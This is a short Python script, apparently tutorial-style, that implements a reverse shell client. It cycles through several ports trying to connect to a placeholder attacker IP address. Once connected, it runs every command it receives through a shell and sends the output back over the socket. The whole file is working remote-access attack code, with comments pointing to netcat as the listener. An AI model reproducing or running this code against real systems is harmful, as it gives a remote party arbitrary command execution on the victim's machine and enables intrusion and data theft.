from __future__ import print_function
import socket
import time
import subprocess

print("the program began searching for a connection")

#Sockets are used for the connection
mysocket = socket.socket()
connected = False

#this will continue in an infinte loop until the program is exited, or connected, then it recieves commands.
while not connected:
    #tries a few different ports, you can add to this list, just make sure to also open in netcat or server.
    for port in [21, 22, 81, 443, 9000]:
        #wait one second before trying another port, this is for throttling
        time.sleep(1)
        try:
            print("Trying", port, end=' ')
            mysocket.connect(("enter IP address here", port))
        except socket.error:
            print("Did not connect to port ")
            continue
        else:
            print("Connected to port " )
            connected = True
            #breaks the loop and stops trying to establish new connections over other ports, goes down next to accept commands
            break

#the while will keep the connection while it is uninterupted
while True:
    # set var commandrequested to mysocket.recv(1024)
    # use subprocess.Popen(to execute commandrequested)
    # Use .communicate to get all of the output and error messages
    # use mysocket.send( to send stdout and stderr )


    #This tells you how big the buffer size is, how big of chunks of data you receive (this is 1kb), up this or lower depending on needs
    commandrequested=mysocket.recv(1024)
    prochandle=subprocess.Popen(commandrequested, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    results, errors= prochandle.communicate()
    results = results + errors
    mysocket.send(results)

